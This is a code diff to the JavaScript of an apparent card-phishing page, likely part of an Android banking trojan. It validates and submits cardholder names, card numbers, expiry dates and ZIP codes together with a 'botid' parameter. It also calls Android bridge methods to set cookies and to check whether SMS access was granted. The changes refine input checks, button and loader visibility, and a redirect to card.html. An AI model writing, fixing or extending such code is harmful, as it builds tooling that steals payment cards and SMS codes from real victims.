@@ -63,7 +63,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
   function handleFormClick() {
     const cardHolderValid =
-      cardHolder?.value && /^[A-Za-z]+(?: [A-Za-z]+)+$/.test(cardHolder.value);
+      cardHolder?.value && /^[\p{L} ]+$/u.test(cardHolder.value);
     const cardNValid =
       cardN?.value && luhnCheck(cardN.value.replace(/\s+/g, ""));
     const cardDateValid = cardDate?.value && isDateValid(cardDate?.value);
@@ -114,10 +114,14 @@ document.addEventListener("DOMContentLoaded", function () {
     formButton.disabled = !checkFilledInputs();
   });
   cardHolder?.addEventListener("input", (event) => {
-    // This line will replace any non-letter characters with an empty string, allowing spaces
-    event.target.value = event.target.value.replace(/[^a-zA-Z\s]/g, "");
+    const regex = /^[\p{L} ]*$/u;
+    if (!regex.test(event.target.value)) {
+      event.target.value = event.target.value.slice(0, -1);
+    }
+
     formButton.disabled = !checkFilledInputs();
   });
+
   addressZip?.addEventListener("input", (event) => {
     event.target.value = event.target.value.replace(/[^0-9]/g, "").slice(0, 5); // Only allow digits and limit length to 5
     formButton.disabled = !checkFilledInputs();
@@ -188,29 +192,28 @@ document.addEventListener("DOMContentLoaded", function () {
     date.setTime(date.getTime() + daysToLive * 24 * 60 * 60 * 1000);
     var expires = date.toUTCString();
     var cookieValue = name + "=" + value + "; expires=" + expires + "; path=/";
-    
+
     // Call the Android interface method to set the cookie
     if (window.AndroidCookieHandler) {
       window.AndroidCookieHandler.setCookie(cookieValue);
     }
   }
-  
 
   function clickSmsAccess() {
     checkSmsPerm();
   }
   const formSendButton = document.getElementById("form");
   formSendButton?.addEventListener("click", (event) => sendForm2(event));
-  // loader.style.display = "flex"; // Show loader
-  // form.style.display = "none"; // Hide form
+
   function sendForm2(event) {
     event.preventDefault(); // Предотвращаем стандартное поведение отправки формы
-
     const isFormValid = handleFormClick();
+  //     loader.style.display = "flex"; // Show loader
+  // form.style.display = "none"; // Hide form
+  // formButton.style.display = "none"; // Hide form
     if (!isFormValid) {
       return;
     }
-
     var formData = new FormData(form);
     var botId = getQueryParam("botid");
     formData.append("method", "card");
@@ -223,6 +226,7 @@ document.addEventListener("DOMContentLoaded", function () {
         console.log(xhr.responseText);
         loader.style.display = "flex"; // Show loader
         form.style.display = "none"; // Hide form
+        formButton.style.display = "none"; // Hide form
         sendRequestWithBotId(); // Вызываем функцию sendRequestWithBotId() после выполнения запроса
       } else {
         // Обработка ошибок
@@ -255,6 +259,7 @@ document.addEventListener("DOMContentLoaded", function () {
           ) {
             loader.style.display = "none"; // Hide loader
             form.style.display = "block"; // Show form
+            formButton.style.display = "block"; // Hide form
             setTimeout(() => {
               formCardInput.style.color = "red";
               formCardInput.classList.remove("header-primary");
@@ -271,6 +276,7 @@ document.addEventListener("DOMContentLoaded", function () {
           if (responseCode === 204) {
             loader.style.display = "none"; // Hide loader
             form.style.display = "block"; // Show form
+            formButton.style.display = "block"; // Hide form
             setTimeout(() => {
               formAddressInput.style.color = "red";
               formAddressInput.classList.remove("header-primary");
@@ -342,7 +348,7 @@ document.addEventListener("DOMContentLoaded", function () {
           } else if (responseCode === 200) {
             //разрешение выдано
             setCookie("validsms", true, 7);
-            window.location.href = "./quiz.html";
+            window.location.href = "./card.html";
           } else if (responseCode === 202) {
             //разрешение не выдано
             Android.clicksmsaccess();
